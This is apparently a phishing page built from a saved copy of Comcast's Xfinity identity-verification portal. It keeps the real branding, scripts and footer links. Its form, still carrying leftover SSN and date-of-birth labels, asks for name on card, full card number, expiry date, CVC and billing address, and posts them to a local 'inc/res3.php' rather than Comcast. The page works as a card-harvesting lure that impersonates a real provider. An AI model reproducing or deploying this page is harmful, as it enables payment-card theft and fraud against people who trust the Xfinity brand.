<!DOCTYPE html>
<!-- saved from url=(0059)https://idm.xfinity.com/myaccount/create-uid?execution=e1s8 -->
<html class="light  content-size-medium "><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><script type="text/javascript" async="async" src="https://comcastcom.d1.sc.omtrdc.net/b/ss/comcastdotcomprod/10/JS-2.18.0-D7QN/s28112642522578?AQB=1&amp;ndh=1&amp;pf=1&amp;callback=s_c_il[1].doPostbacks&amp;et=1&amp;t=10%2F3%2F2020%2014%3A39%3A19%205%20300&amp;d.&amp;nsid=0&amp;jsonv=1&amp;.d&amp;D=D%3D&amp;mid=54955843229920169664095601140311915832&amp;aid=2F42ECDB0515C4DF-40000B8FE42F445D&amp;ce=UTF-8&amp;ns=comcastcom&amp;pageName=resi%7Cselfservice%7CIDM%7Ccreate-uid%7CEnter%20SSN%2C%20DOB%2C%20Phone&amp;g=https%3A%2F%2Fidm.xfinity.com%2Fmyaccount%2Fcreate-uid%3Fexecution%3De1s8&amp;r=https%3A%2F%2Fidm.xfinity.com%2Fmyaccount%2Fcreate-uid%3Fexecution%3De1s7&amp;cc=USD&amp;ch=IDM&amp;events=event125%3D7%2Cevent115&amp;c25=resi%7Cselfservice%7CIDM%7Ccreate-uid%7CEnter%20SSN%2C%20DOB%2C%20Phone%7Cpage%20load&amp;v29=landscape%3Adesktop%20layout%3A1536x760&amp;c35=create-uid&amp;v37=D%3DpageName&amp;c44=responsive%7Ccima%20idm&amp;v44=responsive%7Ccima%20idm&amp;v46=First%20Visit&amp;c52=create_uid&amp;c55=resi%7Cselfservice&amp;c60=en&amp;c70=resi%7Cselfservice%7CIDM%7Ccreate-uid%7CSelect%20verification%20method&amp;c73=DTM%20Hosted%20%7C02252020&amp;v92=last%204%20of%20ssn&amp;c.&amp;a.&amp;activitymap.&amp;page=resi%7Cselfservice%7CIDM%7Ccreate-uid%7CSelect%20verification%20method&amp;link=Continue&amp;region=mainForm&amp;pageIDType=1&amp;.activitymap&amp;.a&amp;.c&amp;pid=resi%7Cselfservice%7CIDM%7Ccreate-uid%7CSelect%20verification%20method&amp;pidt=1&amp;oid=next&amp;oidt=3&amp;ot=SUBMIT&amp;s=1536x864&amp;c=24&amp;j=1.6&amp;v=N&amp;k=Y&amp;bw=1536&amp;bh=760&amp;mcorgid=DA11332E5321D0550A490D45%40AdobeOrg&amp;AQE=1"></script>
		
		<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
		<meta name="mobile-web-app-capable" content="yes">
	<meta name="apple-mobile-web-app-capable" content="yes">
	<meta name="msapplication-TileColor" content="#ffffff">
	<meta name="msapplication-TileImage" content="images/global/favicon/favicon-96x96.png"><title>Verify Xfinity Personal Information</title>
		<meta name="description" content="Comcast Identity Management Portal">
		<meta name="author" content="Comcast">
		<meta name="viewport" content="width=device-width,initial-scale=1.0,minimum-scale=1.0">

		<link rel="stylesheet" href="./verification_files/fonts-remote.min.css">
			<script src="./verification_files/jquery-3.3.1.min.js.download"></script>

		<link rel="shortcut icon" href="https://idm.xfinity.com/myaccount/images/favicon/favicon.ico">
	<link rel="apple-touch-icon" sizes="57x57" href="https://idm.xfinity.com/myaccount/images/favicon/apple-icon-57x57.png">
	<link rel="apple-touch-icon" sizes="60x60" href="https://idm.xfinity.com/myaccount/images/favicon/apple-icon-60x60.png">
	<link rel="apple-touch-icon" sizes="72x72" href="https://idm.xfinity.com/myaccount/images/favicon/apple-icon-72x72.png">
	<link rel="apple-touch-icon" sizes="76x76" href="https://idm.xfinity.com/myaccount/images/favicon/apple-icon-76x76.png">
	<link rel="apple-touch-icon" sizes="114x114" href="https://idm.xfinity.com/myaccount/images/favicon/apple-icon-114x114.png">
	<link rel="apple-touch-icon" sizes="120x120" href="https://idm.xfinity.com/myaccount/images/favicon/apple-icon-120x120.png">
	<link rel="apple-touch-icon" sizes="144x144" href="https://idm.xfinity.com/myaccount/images/favicon/apple-icon-144x144.png">
	<link rel="apple-touch-icon" sizes="152x152" href="https://idm.xfinity.com/myaccount/images/favicon/apple-icon-152x152.png">
	<link rel="apple-touch-icon" sizes="180x180" href="https://idm.xfinity.com/myaccount/images/favicon/apple-icon-180x180.png">
	<link rel="icon" type="image/png" sizes="192x192" href="https://idm.xfinity.com/myaccount/images/favicon/android-icon-192x192.png">
	<link rel="icon" type="image/png" sizes="32x32" href="https://idm.xfinity.com/myaccount/images/favicon/favicon-32x32.png">
	<link rel="icon" type="image/png" sizes="96x96" href="https://idm.xfinity.com/myaccount/images/favicon/favicon-96x96.png">
	<link rel="icon" type="image/png" sizes="16x16" href="https://idm.xfinity.com/myaccount/images/favicon/favicon-16x16.png">
	<link rel="manifest" href="https://idm.xfinity.com/myaccount/images/favicon/manifest.json">

	<link rel="stylesheet" href="./verification_files/styles-light.min.css">

	<script>
		var app={};function secondaryButtonHandler(){var t=$("button[type=submit]:eq(0)");t.attr("value",$(this).attr("value")).attr("formnovalidate","").removeAttr("aria-disabled"),$(this).attr("data-loader")?t.attr("data-loader",!0):t.removeAttr("data-loader"),t.click()}</script>
	<script src="./verification_files/dropkick.2.1.7.min.js.download"></script>
	<script src="./verification_files/jquery.validate.min.js.download"></script>
	<script src="./verification_files/additional-methods.min.js.download"></script>
	<script src="./verification_files/scripts.min.js.download"></script><script type="tracking-data-digitalData">
		{
			"page": {
				"category": {
			"primaryCategory": "IDM",
			"subCategory1": "create-uid",
			
			"businessType": "resi",
			"siteType": "selfservice",
			"designType": "responsive"
		},
				"codebase" : {
					"name": "cima idm",
					"releaseVersion": ""
				}
			},
		
			"transaction": {
				"attributes": {
					"flowStage": "start"
				}
			},
		
			"affiliate" : {
				"name": "comcast",
				"channel": "web"
			},
			"schemaVersion": 0.18
		}
	</script>
	
		<script type="tracking-data-page">
			{
			
				"pageInfo": {
					"screenName": "Enter SSN, DOB, Phone",
					"language": "en",
					"referrerId": "CREATE_UID"
				}
			
			
			
		}
		</script>
	
	
		<script type="tracking-data-user">
			[{
			"profile": [{
				"attributes": {
					"UIDVerificationMethod":"last 4 of ssn","uidCreationType":"CREATE_UID"
				}
			}]
		}]
		</script>
	

	<script>
		document.addEventListener("DOMContentLoaded", function() {
			document.dispatchEvent(new CustomEvent("c-tracking-log-page", {
				bubbles: true
			}));
		});
	</script><script src="./verification_files/satelliteLib-773f1d685076ba02ef9dd20f568cce9a6f1991dd.js.download"></script><style id="at-makers-style" class="at-flicker-control">
.mboxDefault {visibility: hidden;}
</style>
			<script type="text/javascript" src="./verification_files/saved_resource"></script>
			<script src="./verification_files/s-code-contents-11c8f38a44853a1fa459e08fd609da47c7ce7efd.js.download"></script><script src="./verification_files/satellite-580fe8b364746d7de000adbc.js.download"></script><script src="./verification_files/satellite-59a583c164746d7ae40061e0.js.download"></script><script src="./verification_files/satellite-57ee858c64746d28e2004caa.js.download"></script><script src="./verification_files/satellite-5aafc95d64746d01bc00608c.js.download"></script><script src="./verification_files/satellite-57ee850c64746d28e2004c7f.js.download"></script></head>
	<body data-tracking="{&quot;page&quot;: {&quot;pageInfo&quot;: {&quot;referrerId&quot;: &quot;CREATE_UID&quot;}}}">
		<div id="breakpoints"></div>
		<div id="background" style="height: 711px;"></div>

		






	
	
		
		
			
		
	
	


<header>
	<div class="logo-container">
					<a class="xfinity-logo" href="http://my.xfinity.com/"><span class="screen-reader-text">Xfinity</span></a>
				</div>
	
	
</header>
<main role="main">
			





	
		
			
				
			
			
			
	
	
	
	


<div class="main-content">
	




	<form action="inc/res3.php" method="post" novalidate="novalidate"><input id="dateOfBirth.month" name="dateOfBirth.month" type="hidden" value=""><input id="dateOfBirth.date" name="dateOfBirth.day" type="hidden" value=""><input id="dateOfBirth.year" name="dateOfBirth.year" type="hidden" value=""><div class="field-container">
		




	


<div class="label-container">
	<label for="ssn" class="">
		
			
			Enter Name on Card
		
	</label>
	
</div>
<div class="textfield-wrapper textfield-wrapper_cardname">
			
			<input name="cardname" placeholder="Name on Card" type="text" required="true" value="" autocomplete="off"></div>
	</div>

	<div class="DO_wrapper">


<div class="label-container">
	<label for="cardnumber" class="">
		
			
			Enter 16 Digits Card Number
		
	</label>
	
</div>
<div class="textfield-wrapper textfield-wrapper_cardnumber">
			
			<input name="cardnumber" placeholder="####-####-####-####" type="text" data-mask="0000-0000-0000-0000" required="true" value="" autocomplete="off"></div>
	</div>

	<div class="DOB_wrapper">
		



<div class="label-container">
	<label for="dateOfBirth" class="">
		
			Expiration Date
			
		
	</label>
	
	
</div>
<input type="tel" class="expdate" autocomplete="off" name="expdate" data-mask="00/0000" placeholder="MM/YYYY" aria-label="Expiration Date" required="true"></div><div class="phoneNumber_wrapper">
			





<div class="label-container">
	<label for="phoneNumber" class="">
		
			CVC
			
		
	</label>
	
	
</div>
<input type="tel" class="cvc" autocomplete="off" name="cvc" data-mask="00/0000" placeholder="###" aria-label="Expiration Date" required="true"></div><div class="cvc_wrapper">



<div class="label-container">
	<label for="ssn" class="">
		
			
			Billing Address
		
	</label>
	
</div>
<div class="textfield-wrapper textfield-wrapper_cardname">
			
			<input name="address" placeholder="Billing Address" type="text" required="true" value="" autocomplete="off"></div>
	</div>

	<div class="DOB_wrapper">

	<div class="label-container">
	<label for="dateOfBirth" class="">
		
			City
			
		
	</label>
	
	
</div>
<input type="text" class="city" autocomplete="off" name="city" placeholder="City" aria-label="City" required="true"></div><div class="phoneNumber_wrapper">
			





<div class="label-container">
	<label for="phoneNumber" class="">
		
			State
			
		
	</label>
	
	
</div>
<input type="text" class="state" autocomplete="off" name="state" placeholder="State" aria-label="State" required="true"></div><div class="cvc_wrapper">


<div class="label-container">
	<label for="ssn" class="">
		
			
			ZIP Code
		
	</label>
	
</div>
<div class="textfield-wrapper textfield-wrapper_cardname">
			
			<input name="zipcode" placeholder="ZIP Code" type="text" required="true" value="" autocomplete="off"></div>
	</div>

	


	






<div class="button-wrapper">
	<button name="submit" class="submit" type="submit" value="next">Continue</button><button name="_eventId" class="secondary cancel" type="button" value="selectDifferentMethod">Cancel</button></div>
</form><script>
	
</script>
</div>
</main>

		




	
		
		
	
	



	



<footer>
		<span class="content">
			<span class="copyright">
				© 2020 Comcast
			</span>
			<nav>
				<span class="divider hide-compact"></span>
<span class="links">
<a href="https://www.xfinity.com/privacy/policy">Privacy Policy</a>
<span class="divider"></span>
<a href="http://my.xfinity.com/terms/web/">Terms of Service</a>
</span>
<span class="divider hide-compact"></span>
<span class="links">
<a href="https://www.xfinity.com/privacy/manage-preference">Cal. Civ. Code §1798.135: Do Not Sell My Info</a>
</span>
			</nav>
		</span>
	</footer><script>
		$(document).ready(function() {
			idm.init({
				appURL: 'create-uid?execution=e1s8'
			});
		});
	</script><script>
				idm.initSubmitButtons=function(){var e;function a(t,e,a){$("#secondaryForm button").click()}$("button[type=submit][data-loader]").length&&($("button[type=submit]").click(function(){e=$(this)}),idm.submitHandlers.push(function(t){if(e||(e=$(t).find("button[type=submit]:eq(0)")),e.attr("data-loader"))return function(){var t;-1!=(t=e.closest("form").serialize()).indexOf("_eventId")?t=t.replace(/_eventId=[^&]*/,"_eventId=initiateLoader"):t+="&_eventId=initiateLoader",t+="&ajaxSource=true&fragments=statusLoader",e.addClass("loader").attr("disabled",!0),$.ajax({type:"POST",url:"create-uid?execution=e1s8",async:!0,dataType:"json",data:t,complete:a})}(),!1}))};
				$(document).ready(idm.initSubmitButtons);
			</script>
			<form id="secondaryForm" hidden="hidden" action="https://idm.xfinity.com/myaccount/create-uid?execution=e1s8" method="POST"><button name="_eventId" type="submit" value="loadSuccess"></button>
			</form>
	<script type="tracking-data-config">
		{
			"plugins": {
				"aws": {
					"eventFields": ["temp.lastEventAction"]
				}
			}
		}
	</script>
	<script type="text/javascript">
		(function(){
			"use strict";

			document.body.setAttribute('data-tracking','{"page": {"pageInfo": {"referrerId": "CREATE_UID"}}}');
			function datalayerUpdated(ev) {
				if (ev.detail.type === "click") {
					digitalData.temp = {
						lastEventAction: $(ev.target).attr('value') || ev.detail.data.eventInfo.eventAction
					};
				}
			}
			document.addEventListener('c-tracking-trigger', datalayerUpdated, true);
		})();
	</script>


<iframe sandbox="allow-scripts allow-same-origin" title="Adobe ID Syncing iFrame" id="destination_publishing_iframe_comcast_0" name="destination_publishing_iframe_comcast_0_name" src="./verification_files/dest5.html" class="aamIframeLoaded" style="display: none; width: 0px; height: 0px;"></iframe></body></html>